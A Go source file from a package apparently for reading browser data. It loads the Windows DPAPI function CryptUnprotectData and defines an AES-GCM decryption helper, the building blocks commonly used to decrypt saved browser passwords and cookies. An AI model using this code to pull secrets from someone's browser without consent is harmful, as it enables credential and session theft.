package browsers

import (
	"crypto/aes"
	"crypto/cipher"
	"errors"
	"syscall"
	"unsafe"
)

var (
	crypt32     = syscall.NewLazyDLL("crypt32.dll")
	kernel32Dll = syscall.NewLazyDLL("kernel32.dll")

	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
	procLocalFree          = kernel32Dll.NewProc("LocalFree")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func unsafePointer(p interface{}) unsafe.Pointer {
	switch v := p.(type) {
	case *dataBlob:
		return unsafe.Pointer(v)
	default:
		return nil
	}
}

// aesGCMDecrypt decrypts ciphertext using AES-GCM
func aesGCMDecrypt(ciphertext, key, nonce []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("invalid key length")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	if len(nonce) != aesGCM.NonceSize() {
		return nil, errors.New("invalid nonce size")
	}

	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}
